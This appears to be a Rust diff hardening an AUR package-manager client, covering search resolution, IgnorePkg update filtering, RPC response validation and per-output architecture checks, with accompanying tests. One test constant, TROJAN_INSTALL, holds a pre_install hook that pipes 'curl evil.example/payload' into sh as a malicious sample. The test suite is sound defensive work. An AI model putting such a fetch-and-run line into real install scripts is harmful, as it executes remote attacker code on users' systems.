@@ -1350,7 +1350,26 @@ impl AurClient {
             let query_owned = query.to_string();
             let result = tokio::task::spawn_blocking(move || -> Result<Vec<Package>> {
                 let index = AurIndex::open(&index_path)?;
-                let entries = index.search(&query_owned, 50)?;
+                // Install resolution consumes this bounded search: reserve its
+                // exact source/binary identities before substring matches fill it.
+                let binary_name = format!("{query_owned}-bin");
+                let mut entries = Vec::with_capacity(50);
+                for name in [query_owned.as_str(), binary_name.as_str()] {
+                    if let Some(entry) = index.get(name)? {
+                        entries.push(entry);
+                    }
+                }
+                for entry in index.search(&query_owned, 50)? {
+                    if entries.len() == 50 {
+                        break;
+                    }
+                    if !entries
+                        .iter()
+                        .any(|selected| selected.name.as_str() == entry.name.as_str())
+                    {
+                        entries.push(entry);
+                    }
+                }
                 Ok(entries
                     .into_iter()
                     .filter_map(|entry| {
@@ -1579,9 +1598,19 @@ impl AurClient {
     #[instrument(skip(self))]
     pub async fn get_update_list(&self) -> Result<Vec<(String, Version, Version)>> {
         // 1. Get all packages not in official repos
-        let foreign_packages = tokio::task::spawn_blocking(get_potential_aur_packages)
-            .await
-            .context("AUR foreign-package scan task failed")??;
+        let foreign_packages = tokio::task::spawn_blocking(|| -> Result<Vec<String>> {
+            let mut packages = get_potential_aur_packages()?;
+            if packages.is_empty() {
+                return Ok(packages);
+            }
+            let config = crate::core::pacman_conf::PacmanConfig::parse(paths::pacman_conf_path())
+                .context("Failed to load AUR update filters from pacman.conf")?;
+            let ignored = pacman_db::compile_ignore_patterns(&config.ignore_pkg, "IgnorePkg")?;
+            packages.retain(|name| !ignored.is_match(name));
+            Ok(packages)
+        })
+        .await
+        .context("AUR foreign-package scan task failed")??;
 
         if foreign_packages.is_empty() {
             return Ok(Vec::new());
@@ -1667,7 +1696,23 @@ impl AurClient {
                     }
                     ensure_aur_rpc_success(response.status())?;
                     match crate::core::http::bounded_metadata_body(response).await {
-                        Ok(body) => return decode_aur_rpc_body(&body),
+                        Ok(body) => {
+                            let response: AurResponse = decode_aur_rpc_body(&body)?;
+                            let requested: HashSet<&str> =
+                                chunk.iter().map(String::as_str).collect();
+                            let mut seen = HashSet::new();
+                            for package in &response.results {
+                                anyhow::ensure!(
+                                    requested.contains(package.name.as_str()),
+                                    "AUR RPC info response contained an unrequested package"
+                                );
+                                anyhow::ensure!(
+                                    seen.insert(package.name.as_str()),
+                                    "AUR RPC info response contained a duplicate package"
+                                );
+                            }
+                            return Ok(response);
+                        }
                         Err(error) => match error.downcast::<reqwest::Error>() {
                             Ok(error) => last_error = Some(redact_aur_transport_error(error)),
                             Err(error) => return Err(error),
@@ -2776,12 +2821,31 @@ impl AurClient {
         Some(archives)
     }
 
-    fn archive_architecture_approved(srcinfo: &str, architecture: &str) -> bool {
-        super::utils::package_architecture_matches(std::env::consts::ARCH, architecture)
-            && srcinfo
-                .lines()
-                .filter_map(|line| line.split_once('='))
-                .any(|(key, value)| key.trim() == "arch" && value.trim() == architecture)
+    fn archive_architecture_approved(
+        srcinfo: &alpm_srcinfo::SourceInfoV1,
+        output: &str,
+        architecture: &str,
+    ) -> bool {
+        if !super::utils::package_architecture_matches(std::env::consts::ARCH, architecture) {
+            return false;
+        }
+        let Some(package) = srcinfo
+            .packages
+            .iter()
+            .find(|package| package.name.to_string() == output)
+        else {
+            return false;
+        };
+        let architectures = package
+            .architectures
+            .as_ref()
+            .unwrap_or(&srcinfo.base.architectures);
+        match architectures {
+            alpm_types::Architectures::Any => architecture == "any",
+            alpm_types::Architectures::Some(architectures) => architectures
+                .iter()
+                .any(|candidate| candidate.to_string() == architecture),
+        }
     }
 
     fn authorize_archives(
@@ -2808,6 +2872,7 @@ impl AurClient {
                 line.trim_start().starts_with("pkgver()")
                     || line.trim_start().starts_with("pkgver ()")
             });
+        let architecture_metadata = alpm_srcinfo::SourceInfoV1::from_string(srcinfo);
         paths
             .iter()
             .zip(outputs)
@@ -2834,7 +2899,9 @@ impl AurClient {
                     .as_deref()
                     .context("Archive lacks architecture")?;
                 anyhow::ensure!(
-                    Self::archive_architecture_approved(srcinfo, architecture),
+                    architecture_metadata.as_ref().is_ok_and(|metadata| {
+                        Self::archive_architecture_approved(metadata, output, architecture)
+                    }),
                     "AUR archive architecture is not approved for this host"
                 );
                 let declared = Self::srcinfo_install_script(srcinfo, output);
@@ -3091,10 +3158,15 @@ impl AurClient {
             return false;
         }
 
+        let architecture_metadata = alpm_srcinfo::SourceInfoV1::from_string(&srcinfo);
         if !identity
             .architecture
             .as_deref()
-            .is_some_and(|architecture| Self::archive_architecture_approved(&srcinfo, architecture))
+            .is_some_and(|architecture| {
+                architecture_metadata.as_ref().is_ok_and(|metadata| {
+                    Self::archive_architecture_approved(metadata, output, architecture)
+                })
+            })
         {
             tracing::warn!(
                 "Cached artifact provenance for {output}: architecture missing or not approved for this host; rejecting cache hit"
@@ -3994,7 +4066,12 @@ impl AurClient {
                 // A group leader makes util-linux setsid fork, losing the PID
                 // tracked below. Inherit our group so setsid execs in-place;
                 // makepkg then owns a detached session whose PGID is child.id().
-                command.process_group(nix::unistd::getpgrp().as_raw());
+                let parent_group = nix::unistd::getpgrp().as_raw();
+                // Zero can denote a group outside our PID namespace. Passing
+                // it to setpgid creates a child group instead of inheriting it.
+                if parent_group != 0 {
+                    command.process_group(parent_group);
+                }
             }
         }
         let child = command
@@ -4680,6 +4757,317 @@ fn compiler_job_flags(
 #[expect(clippy::unwrap_used)] // Idiomatic in tests: panics on failure with clear error context
 mod tests {
     use super::*;
+
+    // S72 fixture methods must run in a dedicated unprivileged receiver. A root
+    // invocation is a fixture prerequisite error, never the behavioral RED.
+    fn s72_rpc_json(rows: &[(&str, &str)]) -> Vec<u8> {
+        serde_json::to_vec(&serde_json::json!({"type": "multiinfo", "results":
+            rows.iter().map(|(name, version)| serde_json::json!({
+                "Name": name, "Version": version, "Description": null,
+                "Maintainer": null, "NumVotes": 0, "Popularity": 0.0,
+                "OutOfDate": null, "LastModified": 1
+            })).collect::<Vec<_>>()
+        }))
+        .unwrap()
+    }
+
+    async fn s72_info_reply(rows: &[(&str, &str)], requested: &[&str]) -> Result<AurResponse> {
+        let (endpoint, server) = rpc_body_server(s72_rpc_json(rows), false).await?;
+        let names = requested
+            .iter()
+            .map(|name| (*name).to_owned())
+            .collect::<Vec<_>>();
+        let result = tokio::time::timeout(
+            Duration::from_secs(5),
+            AurClient::rpc_info_chunk_at(&endpoint, &names),
+        )
+        .await?;
+        tokio::time::timeout(Duration::from_secs(5), server).await???;
+        result
+    }
+
+    #[tokio::test]
+    async fn aur_rpc_info_rejects_unrequested_package() -> Result<()> {
+        let result = s72_info_reply(&[("core-demo", "2.0-1")], &["aur-demo"]).await;
+        let error = result.expect_err("info response must be bound to this request chunk");
+        assert!(
+            error.to_string().contains("unrequested package"),
+            "{error:#}"
+        );
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn aur_rpc_info_rejects_duplicate_and_conflicting_rows() -> Result<()> {
+        for second_version in ["2.0-1", "3.0-1"] {
+            let result = s72_info_reply(
+                &[("aur-demo", "2.0-1"), ("aur-demo", second_version)],
+                &["aur-demo"],
+            )
+            .await;
+            let error = result.expect_err("one requested name must have at most one result");
+            assert!(error.to_string().contains("duplicate package"), "{error:#}");
+        }
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn aur_rpc_info_allows_reordered_partial_and_empty_results() -> Result<()> {
+        let requested = &["aur-demo", "other-demo", "gone-demo"];
+        let response =
+            s72_info_reply(&[("other-demo", "2.0-1"), ("aur-demo", "2.0-1")], requested).await?;
+        assert_eq!(response.results.len(), 2);
+        assert_eq!(response.results[0].name, "other-demo");
+        let empty = s72_info_reply(&[], requested).await?;
+        assert!(
+            empty.results.is_empty(),
+            "deleted AUR packages may be absent"
+        );
+        Ok(())
+    }
+
+    struct S72Fixture {
+        directory: tempfile::TempDir,
+        conf: PathBuf,
+        db: PathBuf,
+    }
+
+    impl S72Fixture {
+        fn new(names: &[&str]) -> Result<Self> {
+            anyhow::ensure!(
+                !crate::core::is_root(),
+                "S72 prerequisite: isolated receiver must be unprivileged; do not write canonical root paths"
+            );
+            let directory = tempfile::tempdir_in("/var/tmp")?;
+            let root = directory.path().join("root");
+            let db = directory.path().join("db");
+            let cache = directory.path().join("cache");
+            let conf = directory.path().join("pacman.conf");
+            std::fs::create_dir_all(&root)?;
+            std::fs::create_dir_all(db.join("sync"))?;
+            std::fs::create_dir_all(&cache)?;
+            for name in names {
+                let dir = db.join("local").join(format!("{name}-1.0-1"));
+                std::fs::create_dir_all(&dir)?;
+                std::fs::write(
+                    dir.join("desc"),
+                    format!(
+                        "%NAME%\n{name}\n\n%VERSION%\n1.0-1\n\n%DESC%\nS72 fixture\n\n%REASON%\n0\n\n%INSTALLDATE%\n1\n\n"
+                    ),
+                )?;
+            }
+            std::fs::write(&conf, "[options]\n")?;
+            paths::set_test_overrides(Some(root), Some(db.clone()));
+            Ok(Self {
+                directory,
+                conf,
+                db,
+            })
+        }
+
+        fn with_environment(
+            &self,
+            future: impl std::future::Future<Output = Result<()>>,
+        ) -> Result<()> {
+            let cache = self.directory.path().join("cache");
+            temp_env::with_vars(
+                [
+                    ("OMG_TEST_MODE", None::<&std::ffi::OsStr>),
+                    ("OMG_PACMAN_CONF", Some(self.conf.as_os_str())),
+                    ("OMG_CACHE_DIR", Some(cache.as_os_str())),
+                ],
+                || -> Result<()> {
+                    assert_eq!(paths::pacman_conf_path(), self.conf);
+                    assert_eq!(paths::cache_dir(), cache);
+                    pacman_db::invalidate_caches()?;
+                    tokio::runtime::Builder::new_current_thread()
+                        .enable_all()
+                        .build()?
+                        .block_on(future)
+                },
+            )
+        }
+
+        fn client(&self) -> AurClient {
+            let mut settings = Settings::default();
+            settings.aur.use_metadata_archive = true;
+            settings.aur.metadata_cache_ttl_secs = 3600;
+            AurClient {
+                build_dir: self.directory.path().join("build"),
+                settings,
+                package_base_locks: Arc::new(dashmap::DashMap::new()),
+            }
+        }
+
+        fn index(names: &[&str]) -> Result<()> {
+            let archive = metadata_path();
+            std::fs::create_dir_all(archive.parent().unwrap())?;
+            let data = names
+                .iter()
+                .map(|name| (*name, "2.0-1"))
+                .collect::<Vec<_>>();
+            let envelope: serde_json::Value = serde_json::from_slice(&s72_rpc_json(&data))?;
+            let file = File::create(&archive)?;
+            let mut gzip = flate2::write::GzEncoder::new(file, flate2::Compression::default());
+            std::io::Write::write_all(&mut gzip, &serde_json::to_vec(&envelope["results"])?)?;
+            gzip.finish()?;
+            crate::package_managers::aur_index::build_index(&archive, &index_path())?;
+            anyhow::ensure!(
+                metadata_index_is_fresh(&archive, &index_path(), Duration::from_hours(1)),
+                "fixture index must actually be fresh and coherent"
+            );
+            Ok(())
+        }
+
+        fn local_bytes(&self) -> Result<Vec<(String, Vec<u8>)>> {
+            let mut files = Vec::new();
+            for entry in std::fs::read_dir(self.db.join("local"))? {
+                let entry = entry?;
+                files.push((
+                    entry.file_name().to_string_lossy().into_owned(),
+                    std::fs::read(entry.path().join("desc"))?,
+                ));
+            }
+            files.sort_by(|a, b| a.0.cmp(&b.0));
+            Ok(files)
+        }
+    }
+
+    impl Drop for S72Fixture {
+        fn drop(&mut self) {
+            paths::reset_test_overrides();
+        }
+    }
+
+    #[test]
+    fn aur_updates_honor_exact_and_glob_ignore_pkg_in_fresh_index() -> Result<()> {
+        if crate::core::testing::run_isolated_test(
+            "package_managers::aur::client::tests::aur_updates_honor_exact_and_glob_ignore_pkg_in_fresh_index",
+        ) {
+            return Ok(());
+        }
+        if Settings::rerun_test_unprivileged(
+            "package_managers::aur::client::tests::aur_updates_honor_exact_and_glob_ignore_pkg_in_fresh_index",
+        ) {
+            return Ok(());
+        }
+        let fixture = S72Fixture::new(&["held-demo", "held-extra", "free-demo"])?;
+        fixture.with_environment(async {
+            S72Fixture::index(&["held-demo", "held-extra", "free-demo"])?;
+            let client = fixture.client();
+            let before = fixture.local_bytes()?;
+            let names = |mut updates: Vec<(String, Version, Version)>| {
+                updates.sort_by(|a, b| a.0.cmp(&b.0));
+                for (_, old, new) in &updates {
+                    assert_eq!(old.to_string(), "1.0-1");
+                    assert_eq!(new.to_string(), "2.0-1");
+                }
+                updates.into_iter().map(|row| row.0).collect::<Vec<_>>()
+            };
+            assert_eq!(
+                names(client.get_update_list().await?),
+                ["free-demo", "held-demo", "held-extra"]
+            );
+            std::fs::write(&fixture.conf, "[options]\nIgnorePkg = held-demo\n")?;
+            assert_eq!(
+                names(client.get_update_list().await?),
+                ["free-demo", "held-extra"]
+            );
+            std::fs::write(&fixture.conf, "[options]\nIgnorePkg = held-*\n")?;
+            assert_eq!(names(client.get_update_list().await?), ["free-demo"]);
+            assert_eq!(
+                fixture.local_bytes()?,
+                before,
+                "update reads preserve package state"
+            );
+            Ok(())
+        })
+    }
+
+    #[test]
+    fn aur_updates_all_ignored_do_not_require_index_or_rpc() -> Result<()> {
+        if crate::core::testing::run_isolated_test(
+            "package_managers::aur::client::tests::aur_updates_all_ignored_do_not_require_index_or_rpc",
+        ) {
+            return Ok(());
+        }
+        if Settings::rerun_test_unprivileged(
+            "package_managers::aur::client::tests::aur_updates_all_ignored_do_not_require_index_or_rpc",
+        ) {
+            return Ok(());
+        }
+        let fixture = S72Fixture::new(&["held-demo"])?;
+        fixture.with_environment(async {
+            std::fs::write(&fixture.conf, "[options]\nIgnorePkg = held-*\n")?;
+            assert!(!metadata_path().exists() && !index_path().exists());
+            let before = fixture.local_bytes()?;
+            let result =
+                tokio::time::timeout(Duration::from_secs(2), fixture.client().get_update_list())
+                    .await;
+            let updates = result.expect("ignored-only update check must complete without RPC")?;
+            assert!(updates.is_empty());
+            assert_eq!(fixture.local_bytes()?, before);
+            Ok(())
+        })
+    }
+
+    #[test]
+    fn aur_rpc_updates_rejects_unsolicited_installed_official_package() -> Result<()> {
+        if crate::core::testing::run_isolated_test(
+            "package_managers::aur::client::tests::aur_rpc_updates_rejects_unsolicited_installed_official_package",
+        ) {
+            return Ok(());
+        }
+        if Settings::rerun_test_unprivileged(
+            "package_managers::aur::client::tests::aur_rpc_updates_rejects_unsolicited_installed_official_package",
+        ) {
+            return Ok(());
+        }
+        let fixture = S72Fixture::new(&["aur-demo", "core-demo"])?;
+        fixture.with_environment(async {
+            let desc = b"%NAME%\ncore-demo\n\n%VERSION%\n2.0-1\n\n%DESC%\nS72 official fixture\n\n";
+            let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+            let mut archive = tar::Builder::new(encoder);
+            let mut header = tar::Header::new_gnu();
+            header.set_size(desc.len() as u64);
+            header.set_mode(0o644);
+            header.set_cksum();
+            archive.append_data(&mut header, "core-demo-2.0-1/desc", &desc[..])?;
+            let compressed = archive.into_inner()?.finish()?;
+            let sync_path = fixture.db.join("sync/core.db");
+            std::fs::write(&sync_path, compressed)?;
+            std::fs::write(
+                &fixture.conf,
+                "[options]\n[core]\nServer = https://example.invalid/$repo/$arch\n",
+            )?;
+            pacman_db::invalidate_caches()?;
+            let foreign = get_potential_aur_packages()?;
+            assert_eq!(
+                foreign,
+                ["aur-demo"],
+                "fixture must prove core-demo is official and unrequested"
+            );
+            let local_before = fixture.local_bytes()?;
+            let sync_before = std::fs::read(&sync_path)?;
+            let (endpoint, server) =
+                rpc_body_server(s72_rpc_json(&[("core-demo", "3.0-1")]), false).await?;
+            let result = tokio::time::timeout(
+                Duration::from_secs(5),
+                fixture.client().query_aur_updates_at(&endpoint, &foreign),
+            )
+            .await?;
+            tokio::time::timeout(Duration::from_secs(5), server).await???;
+            let error =
+                result.expect_err("RPC must not relabel an installed official package as AUR");
+            assert!(
+                format!("{error:#}").contains("AUR RPC response was invalid"),
+                "{error:#}"
+            );
+            assert_eq!(fixture.local_bytes()?, local_before);
+            assert_eq!(std::fs::read(&sync_path)?, sync_before);
+            Ok(())
+        })
+    }
 
     async fn rpc_body_server(
         body: Vec<u8>,
@@ -6126,6 +6514,31 @@ mod tests {
             );
             return Ok(());
         }
+        // The exact probe child must observe the context being tested. A
+        // namespace wrapper's identity alone does not establish this child's
+        // inherited process group after the isolation subprocess is launched.
+        const EXPECT_PARENT_GROUP: &str = "OMG_NATIVE_BUILD_EXPECT_PARENT_PGRP";
+        let probe_pid = std::process::id();
+        let probe_uid = nix::unistd::getuid().as_raw();
+        let probe_group = nix::unistd::getpgrp().as_raw();
+        println!(
+            "[native-build-probe-context] mode={mode} pid={probe_pid} uid={probe_uid} pgrp={probe_group}"
+        );
+        if let Some(expected) = std::env::var_os(EXPECT_PARENT_GROUP) {
+            match expected.to_str() {
+                Some("zero") => anyhow::ensure!(
+                    probe_group == 0,
+                    "native {mode} probe expected inherited group zero; actual PID {probe_pid}, PGID {probe_group}"
+                ),
+                Some("nonzero") => anyhow::ensure!(
+                    probe_group > 0,
+                    "native {mode} probe expected a visible inherited group; actual PID {probe_pid}, PGID {probe_group}"
+                ),
+                _ => anyhow::bail!(
+                    "{EXPECT_PARENT_GROUP} must be 'zero' or 'nonzero' when configured"
+                ),
+            }
+        }
         nix::sys::prctl::set_child_subreaper(true)?;
         let directory = tempfile::tempdir()?;
         let fixture = directory.path().join("makepkg");
@@ -7198,6 +7611,178 @@ mod tests {
 
     const LEGIT_INSTALL: &str = "pre_install() {\n  echo legit\n}\n";
     const TROJAN_INSTALL: &str = "pre_install() {\n  curl evil.example/payload | sh\n}\n";
+
+    // Fixture-only code. The real archive reader and sealed output authorization
+    // must enforce each requested output's declared architecture independently.
+    fn assert_split_architecture_authorization(
+        srcinfo: &str,
+        requested: &[(&str, &str)],
+        accepted: bool,
+    ) -> Result<()> {
+        assert!(
+            !crate::core::is_root(),
+            "archive fixture must use an ordinary UID"
+        );
+        let audit_dir = tempfile::tempdir()?;
+        temp_env::with_var("OMG_DATA_DIR", Some(audit_dir.path()), || -> Result<()> {
+            let source_dir = tempfile::tempdir()?;
+            let archive_dir = tempfile::tempdir()?;
+            let pkgbuild = b"pkgbase=split\npkgname=(app docs)\npkgver=1.0\npkgrel=1\n";
+            std::fs::write(source_dir.path().join("PKGBUILD"), pkgbuild)?;
+            std::fs::write(source_dir.path().join(".SRCINFO"), srcinfo)?;
+            let mut paths = Vec::new();
+            for (name, architecture) in requested {
+                let archive = archive_dir
+                    .path()
+                    .join(format!("{name}-1.0-1-{architecture}.pkg.tar.gz"));
+                let pkginfo = format!(
+                    "pkgname = {name}\npkgbase = split\npkgver = 1.0-1\narch = {architecture}\n"
+                );
+                let buildinfo = format!(
+                    "format = 2\npkgname = {name}\npkgbase = split\npkgver = 1.0-1\npkgarch = {architecture}\n"
+                );
+                write_tar_gz(
+                    &archive,
+                    &[
+                        (".PKGINFO", pkginfo.as_bytes()),
+                        (".BUILDINFO", buildinfo.as_bytes()),
+                        (".MTREE", b"#mtree\n"),
+                    ],
+                );
+                paths.push(archive);
+            }
+            let archive_before = paths
+                .iter()
+                .map(std::fs::read)
+                .collect::<std::io::Result<Vec<_>>>()?;
+            let source = ReviewedSource::capture(source_dir.path())?;
+            let outputs = requested
+                .iter()
+                .map(|(name, _)| (*name).to_owned())
+                .collect::<Vec<_>>();
+            // This is the production final authorization boundary, before install.
+            let authorized =
+                AurClient::authorize_archives(&paths, &source, "split", &outputs, true);
+            if accepted {
+                let authorized = authorized?;
+                assert_eq!(authorized.len(), requested.len());
+                for (snapshot, (name, architecture)) in authorized.iter().zip(requested) {
+                    let identity =
+                        AurClient::cached_archive_identity(Path::new(&snapshot.handoff()))?
+                            .expect("sealed accepted archive must retain its actual metadata");
+                    assert_eq!(identity.name, *name);
+                    assert_eq!(identity.base, "split");
+                    assert_eq!(identity.version, "1.0-1");
+                    assert_eq!(identity.architecture.as_deref(), Some(*architecture));
+                }
+            } else {
+                let error =
+                    authorized.expect_err("wrong selected-output architecture must be refused");
+                assert_eq!(
+                    error.to_string(),
+                    "AUR archive architecture is not approved for this host"
+                );
+            }
+            // Retained legacy metadata check is cfg(test), not production reuse.
+            let cached = AurClient::select_cached_artifacts(
+                paths.clone(),
+                &outputs,
+                source_dir.path(),
+                "split",
+            );
+            if accepted {
+                assert_eq!(cached, Some(paths.clone()));
+            } else {
+                assert_eq!(cached, None);
+            }
+            assert_eq!(std::fs::read(source_dir.path().join("PKGBUILD"))?, pkgbuild);
+            assert_eq!(
+                std::fs::read(source_dir.path().join(".SRCINFO"))?,
+                srcinfo.as_bytes()
+            );
+            for (path, before) in paths.iter().zip(archive_before) {
+                assert_eq!(std::fs::read(path)?, before);
+            }
+            Ok(())
+        })
+    }
+
+    #[test]
+    fn split_output_architecture_rejects_sibling_any_for_host_output() -> Result<()> {
+        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_sibling_any_for_host_output";
+        if crate::core::testing::run_isolated_test(TEST)
+            || crate::config::Settings::rerun_test_unprivileged(TEST)
+        {
+            return Ok(());
+        }
+        let host = super::super::utils::current_arch()
+            .expect("supported Arch test host")
+            .to_string();
+        let srcinfo = format!(
+            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
+        );
+        assert_split_architecture_authorization(&srcinfo, &[("app", &host)], true)?;
+        assert_split_architecture_authorization(&srcinfo, &[("app", "any")], false)
+    }
+
+    #[test]
+    fn split_output_architecture_rejects_base_host_for_any_override() -> Result<()> {
+        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_base_host_for_any_override";
+        if crate::core::testing::run_isolated_test(TEST)
+            || crate::config::Settings::rerun_test_unprivileged(TEST)
+        {
+            return Ok(());
+        }
+        let host = super::super::utils::current_arch()
+            .expect("supported Arch test host")
+            .to_string();
+        let srcinfo = format!(
+            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
+        );
+        assert_split_architecture_authorization(&srcinfo, &[("docs", "any")], true)?;
+        assert_split_architecture_authorization(&srcinfo, &[("docs", &host)], false)
+    }
+
+    #[test]
+    fn split_output_architecture_rejects_base_any_for_host_override() -> Result<()> {
+        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_base_any_for_host_override";
+        if crate::core::testing::run_isolated_test(TEST)
+            || crate::config::Settings::rerun_test_unprivileged(TEST)
+        {
+            return Ok(());
+        }
+        let host = super::super::utils::current_arch()
+            .expect("supported Arch test host")
+            .to_string();
+        let srcinfo = format!(
+            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = any\npkgname = app\n\tarch = {host}\npkgname = docs\n"
+        );
+        assert_split_architecture_authorization(&srcinfo, &[("docs", "any")], true)?;
+        assert_split_architecture_authorization(&srcinfo, &[("app", &host)], true)?;
+        assert_split_architecture_authorization(&srcinfo, &[("app", "any")], false)
+    }
+
+    #[test]
+    fn split_output_architecture_refuses_whole_pair_with_wrong_second_output() -> Result<()> {
+        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_refuses_whole_pair_with_wrong_second_output";
+        if crate::core::testing::run_isolated_test(TEST)
+            || crate::config::Settings::rerun_test_unprivileged(TEST)
+        {
+            return Ok(());
+        }
+        let host = super::super::utils::current_arch()
+            .expect("supported Arch test host")
+            .to_string();
+        let srcinfo = format!(
+            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
+        );
+        assert_split_architecture_authorization(
+            &srcinfo,
+            &[("app", &host), ("docs", "any")],
+            true,
+        )?;
+        assert_split_architecture_authorization(&srcinfo, &[("app", &host), ("docs", &host)], false)
+    }
 
     #[test]
     fn cached_architecture_eligibility_matches_sealed_authorization() -> Result<()> {
